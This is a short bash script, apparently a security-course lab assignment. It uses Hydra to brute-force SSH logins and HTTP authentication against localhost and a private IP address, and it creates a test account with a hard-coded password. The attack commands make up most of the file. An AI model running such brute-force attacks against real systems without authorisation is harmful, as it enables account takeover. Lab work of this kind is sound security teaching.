#!/bin/bash
# Assignment 04: Password Attack Simulation using Hydra

TARGET_SSH_IP=${1:-"127.0.0.1"}
TARGET_HTTP_IP=${2:-"10.49.183.74"}

if ! command -v hydra &> /dev/null; then
    sudo apt update && sudo apt install -y hydra
fi

# Ensure SSH service and test user exist if running against localhost
if [ "$TARGET_SSH_IP" == "127.0.0.1" ]; then
    sudo systemctl start ssh 2>/dev/null || true
    sudo useradd -m guest -s /bin/bash 2>/dev/null || true
    echo "guest:k1ll0r7n" | sudo chpasswd 2>/dev/null || true
fi

echo "[*] Part 1: SSH Brute-Force Password Cracking"
hydra -L wordlist.txt -P wordlist.txt -t 4 "ssh://$TARGET_SSH_IP:22"

echo ""
echo "[*] Part 2: HTTP Authentication Cracking"
if nc -z -w 2 "$TARGET_HTTP_IP" 80 &>/dev/null; then
    hydra -l bob -P wordlist.txt -t 4 "$TARGET_HTTP_IP" http-get /protected
fi
